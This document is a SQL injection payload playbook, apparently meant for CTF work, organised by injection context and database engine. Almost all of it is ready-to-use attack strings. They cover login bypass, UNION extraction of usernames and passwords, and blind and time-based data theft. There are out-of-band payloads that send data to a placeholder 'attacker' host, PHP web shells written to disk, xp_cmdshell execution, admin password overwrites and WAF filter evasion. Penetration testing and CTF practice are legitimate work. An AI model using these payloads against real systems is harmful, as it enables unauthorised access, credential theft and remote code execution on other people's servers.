# SQL Injection Playbook

Use this payload playbook by context, filter behavior, and DBMS. For NoSQL/GraphQL and ORM/query DSL cases, read `nosql-graphql.md` and `orm-query-dsl.md`.

## Contexts And Entry Points

### Numeric Context

```sql
1 AND 1=1
1 AND 1=2
1 OR 1=1
1 UNION SELECT NULL
1 ORDER BY 1
1;SELECT 1
```

Numeric contexts often need no quotes, so they are useful when quote characters are filtered. If the parameter is cast to an integer, test scientific notation, signs, arrays/JSON types, duplicate parameters, or a later server-side concatenation point.

### String Context

```sql
' AND '1'='1
' AND '1'='2
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
```

Common closures:

```sql
'
"
')
")
'))
"))
%')
%"))
```

### LIKE / Search

```sql
%' AND 1=1--
%' AND 1=2--
%' UNION SELECT NULL,NULL--
%' ESCAPE '\'
```

In search flows, `%`, `_`, escape characters, case sensitivity, and collation can all affect the oracle. Prefix extraction can use `LIKE 'a%'`, `GLOB 'a*'`, `REGEXP '^a'`, or DBMS string functions.

### ORDER BY / Identifiers

Bind parameters do not protect column names, table names, or sort direction:

```sql
id
id DESC
1
CASE WHEN 1=1 THEN id ELSE title END
CASE WHEN 1=2 THEN id ELSE title END
(SELECT CASE WHEN 1=1 THEN id ELSE title END)
```

If only direction is controllable:

```sql
ASC,(CASE WHEN 1=1 THEN 1 ELSE 1/0 END)
DESC,(SELECT CASE WHEN 1=2 THEN 1 ELSE 1/0 END)
```

MSSQL and Oracle sort injection can use errors or subqueries to create differences. MySQL can use `extractvalue/updatexml`, `if()`, or subqueries.

### INSERT / UPDATE / Profile Data

```sql
a'
a'),('probe','probe
a' WHERE 1=2--
a', role='admin'--
```

MySQL-specific:

```sql
ON DUPLICATE KEY UPDATE password='known',role='admin'
```

In UPDATE or password-reset flows, common goals are changing the target user, broadening the `WHERE` condition, or writing target data into a field the attacker can read.

### Second-Order / Routed SQLi

Store the payload in one step and trigger the query in another:

```sql
stored_username = admin'--
stored_email = x' OR '1'='1
stored_sort = CASE WHEN 1=1 THEN id ELSE title END
```

When a first query result feeds a second query, use UNION or a controllable field to build the second-stage payload:

```sql
UNION SELECT 'admin''--',2,3
UNION SELECT 0x61646d696e272d2d,2,3
```

## DBMS Differences

### Fingerprint And Current Values

```sql
-- MySQL
database()
user()
version()
@@version

-- SQLite
sqlite_version()

-- PostgreSQL
current_database()
current_user
version()

-- MSSQL
DB_NAME()
SYSTEM_USER
@@version

-- Oracle
USER
SYS_CONTEXT('USERENV','CURRENT_SCHEMA')
banner FROM v$version
```

### Metadata Sources

```sql
-- MySQL
information_schema.tables
information_schema.columns
mysql.innodb_table_stats
sys.schema_table_statistics

-- SQLite
sqlite_master
sqlite_schema

-- PostgreSQL
pg_catalog.pg_tables
pg_catalog.pg_class
pg_catalog.pg_attribute
information_schema.tables

-- MSSQL
sys.tables
sys.columns
information_schema.tables

-- Oracle
all_tables
all_tab_columns
user_tables
```

### Common Function Differences

```sql
-- substring
SUBSTR(x,1,1)              MySQL / SQLite / Oracle
SUBSTRING(x,1,1)           PostgreSQL / MSSQL

-- length
LENGTH(x)                  MySQL / SQLite / PostgreSQL / Oracle
LEN(x)                     MSSQL

-- character code
ASCII(SUBSTR(x,1,1))       MySQL / PostgreSQL / MSSQL / Oracle
unicode(substr(x,1,1))     SQLite

-- concatenation
CONCAT(a,b)                MySQL / newer MSSQL
a||b                       PostgreSQL / Oracle / SQLite
a+b                        MSSQL

-- single row
LIMIT 1 OFFSET 0           MySQL / PostgreSQL / SQLite
TOP 1                      MSSQL
ROWNUM=1                   Oracle
FETCH FIRST 1 ROWS ONLY    Oracle / PostgreSQL / newer MSSQL
```

### Delay Functions

```sql
SLEEP(3)                                  MySQL
pg_sleep(3)                               PostgreSQL
WAITFOR DELAY '00:00:03'                  MSSQL
DBMS_LOCK.SLEEP(3)                        Oracle
randomblob(100000000)                     SQLite recomputation delay
```

## UNION Echo

### Column Count And Visible Slots

```sql
ORDER BY 1
ORDER BY 2
ORDER BY 3
UNION SELECT NULL
UNION SELECT NULL,NULL
UNION SELECT 1,2,3
UNION ALL SELECT 1,2,3
AND 1=0 UNION SELECT 1,2,3
```

### Current Database And Version

```sql
-- MySQL
UNION SELECT database(),user(),version()

-- SQLite
UNION SELECT sqlite_version(),2,3

-- PostgreSQL
UNION SELECT current_database(),current_user,version()

-- MSSQL
UNION SELECT DB_NAME(),SYSTEM_USER,@@version

-- Oracle
UNION SELECT USER,banner,NULL FROM v$version
```

### Tables, Columns, Target Data

```sql
-- MySQL
UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()
UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'
UNION SELECT username,password,role FROM users

-- SQLite
UNION SELECT name,sql,3 FROM sqlite_master WHERE type='table'
UNION SELECT username,password,role FROM users

-- PostgreSQL
UNION SELECT tablename,schemaname,3 FROM pg_catalog.pg_tables
UNION SELECT column_name,table_name,3 FROM information_schema.columns WHERE table_name='users'

-- MSSQL
UNION SELECT name,object_id,3 FROM sys.tables
UNION SELECT name,column_id,3 FROM sys.columns WHERE object_id=OBJECT_ID('users')

-- Oracle
UNION SELECT table_name,NULL,NULL FROM all_tables
UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS'
```

### Type Mismatch

```sql
CAST(x AS CHAR)
CONVERT(x, CHAR)
CAST(x AS TEXT)
CAST(x AS VARCHAR)
TO_CHAR(x)
NULL
```

### Blocked Keywords

```sql
UNION/**/SELECT
UNION%0aSELECT
UNIunionON SELselectECT
UNION ALL SELECT
/*!50000UNION*/ /*!50000SELECT*/
```

## Blind Or Error-Based Extraction

### Boolean

```sql
AND 1=1
AND 1=2
AND LENGTH(database())>5
AND ASCII(SUBSTR(database(),1,1))>77
AND (SELECT COUNT(*) FROM users)>0
AND EXISTS(SELECT 1 FROM users WHERE username='admin')
```

### Error

```sql
AND CASE WHEN 1=1 THEN 1 ELSE 1/0 END
AND CASE WHEN 1=2 THEN 1 ELSE 1/0 END

-- MySQL
AND extractvalue(1,concat(0x7e,database(),0x7e))
AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)

-- PostgreSQL
AND CAST((SELECT current_database()) AS int)=1

-- MSSQL
AND 1=CONVERT(int,(SELECT DB_NAME()))

-- Oracle
AND 1=TO_NUMBER((SELECT USER FROM dual))
```

### Time

```sql
-- MySQL
AND IF(ASCII(SUBSTR(database(),1,1))>77,SLEEP(3),0)

-- PostgreSQL
AND CASE WHEN ASCII(SUBSTRING(current_database(),1,1))>77 THEN pg_sleep(3) ELSE pg_sleep(0) END IS NULL

-- MSSQL
IF (ASCII(SUBSTRING(DB_NAME(),1,1))>77) WAITFOR DELAY '00:00:03'

-- SQLite
AND CASE WHEN unicode(substr((SELECT name FROM sqlite_master LIMIT 1),1,1))>77 THEN randomblob(100000000) ELSE 1 END
```

### OOB

```sql
-- MSSQL
EXEC master..xp_dirtree '\\attacker\share'

-- Oracle
UTL_HTTP.REQUEST('http://attacker/'||(SELECT USER FROM dual))
UTL_INADDR.GET_HOST_ADDRESS((SELECT USER FROM dual)||'.attacker')

-- MySQL Windows / FILE privilege
LOAD_FILE('\\\\attacker\\share\\x')
```

## Login And Returned-Row Control

### Classic Login Bypass

```sql
' OR '1'='1'--
' OR 1=1--
admin'--
") OR ("1"="1
') OR ('1'='1
```

### Choose The Returned User

```sql
admin' AND '1'='1'--
admin' AND '1'='2'--
' OR username='admin'--
' OR role='admin' ORDER BY id LIMIT 1--
```

### Forge A User Row With UNION

```sql
' AND 1=0 UNION SELECT 'admin','hash','admin'--
' AND 1=0 UNION SELECT 1,'admin','admin@example.com','admin'--
' AND 1=0 UNION SELECT 'admin','$2b$12$knownbcrypt','admin'--
```

### Backslash Escape / Truncation / Comments

```sql
username=\
password= OR 1=1--
```

```sql
admin'#
admin'-- -
admin'/*
```

If the password is hashed before comparison, prefer forging a compatible hash row, finding fixed-hash comparison behavior, or making the query return a path that skips password validation.

## Non-SELECT Exploitation

### INSERT Multi-Row / Column Shift

```sql
abc'),('attacker','knownpass','admin')--
abc', 'x'),('attacker','knownpass')--
```

### UPDATE Overwrite

```sql
x', role='admin' WHERE username='attacker'--
x', password='known' WHERE username='admin'--
x' OR username='admin'--
```

### File Write / RCE Helpers

```sql
-- MySQL
UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'
SELECT LOAD_FILE('/etc/passwd')

-- PostgreSQL
COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php'

-- MSSQL
EXEC xp_cmdshell 'whoami'

-- SQLite
ATTACH DATABASE '/var/www/html/shell.php' AS pwn
CREATE TABLE pwn.x(dataz text)
INSERT INTO pwn.x VALUES('<?php system($_GET["cmd"]); ?>')
```

These depend on permissions and configuration. In CTF targets, use them only after observing evidence for FILE, `xp_cmdshell`, `COPY`, `ATTACH`, or an equivalent capability.

## Filter Bypasses

### Whitespace Blocked

```sql
UNION/**/SELECT
UNION%0aSELECT
UNION%09SELECT
(SELECT(database()))
1/**/AND/**/1=1
```

### Quotes Blocked

```sql
0x61646d696e                         MySQL/MSSQL hex
CHAR(97,100,109,105,110)             MySQL/MSSQL
CHR(97)||CHR(100)||CHR(109)          Oracle/PostgreSQL
$$admin$$                            PostgreSQL dollar quote
NCHAR(97)+NCHAR(100)                 MSSQL
X'61646d696e'                        SQLite blob/string contexts
```

### Comma Blocked

```sql
LIMIT 1 OFFSET 0
SUBSTR(x FROM 1 FOR 1)
MID(x FROM 1 FOR 1)
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b
```

Use `JOIN` to replace multi-column comma syntax where possible.

### Comments Blocked

Complete the original query tail instead of relying on a comment:

```sql
' AND '1'='1
') AND ('1'='1
' OR '1'='1
') OR ('1'='1
```

Or close parentheses and quotes so the following syntax remains naturally valid.

### Comparison Operators Blocked

```sql
LIKE
IN
BETWEEN
IS NULL
IS NOT NULL
REGEXP
GLOB
NOT BETWEEN
STRCMP(a,b)
```

### `AND` / `OR` Blocked

```sql
&&
||
INTERSECT
UNION
CASE WHEN
IF(condition,a,b)
```

### `UNION` / `SELECT` Blocked

```sql
UN/**/ION SEL/**/ECT
UNIunionON SELselectECT
/*!UNION*/ /*!SELECT*/
WITH cte AS (...) SELECT ...
VALUES(...)
TABLE table_name
```

### `information_schema` Blocked

```sql
-- MySQL
mysql.innodb_table_stats
sys.schema_table_statistics
SHOW TABLES

-- SQLite
sqlite_master
sqlite_schema

-- PostgreSQL
pg_catalog.pg_tables
pg_catalog.pg_class
pg_catalog.pg_attribute

-- MSSQL
sys.tables
sys.columns

-- Oracle
all_tables
all_tab_columns
user_tables
```

### Function Name Blocked

```sql
SUBSTR -> SUBSTRING / MID / LEFT / RIGHT
ASCII  -> ORD / unicode / TO_NUMBER(ASCIISTR(...)) / cast byte
LENGTH -> LEN / CHAR_LENGTH / OCTET_LENGTH
SLEEP  -> BENCHMARK / pg_sleep / WAITFOR / randomblob
IF     -> CASE WHEN
CONCAT -> || / + / CONCAT_WS
```

### Case Or Single-Delete Filters

```sql
UnIoN SeLeCt
UNunionION SELselectECT
S/**/ELECT
SEL%0aECT
/*!50000SELECT*/
```

### Encoding And Parser Differences

```text
URL encoding / double URL encoding
JSON number, boolean, null, array, or object type substitution
Duplicate parameter overwrite: id=1&id=payload
Delimiter pollution: id=1;payload
Wide bytes: GBK/Shift-JIS payloads such as %bf%27 or %df%27 only when that encoding chain exists
XML entities: &#x27; and &apos;
HQL/ORM whitespace: U+00A0, comments may not work
```

### WAF Regex Edge Cases

```text
Keyword nesting: SELSELECTECT
Long input causing regex backtracking failure
MySQL versioned comments
Backend concatenation after parameter splitting: q=UNI&q=ON SELECT
```

## Common Target Data

```sql
-- current identity/database
database(), user(), version()
current_database(), current_user
DB_NAME(), SYSTEM_USER, @@version
USER, SYS_CONTEXT('USERENV','CURRENT_SCHEMA')

-- table candidates
users
user
accounts
members
admin
credentials
flags
secrets

-- column candidates
username
password
passwd
hash
role
is_admin
token
api_key
secret
flag
```
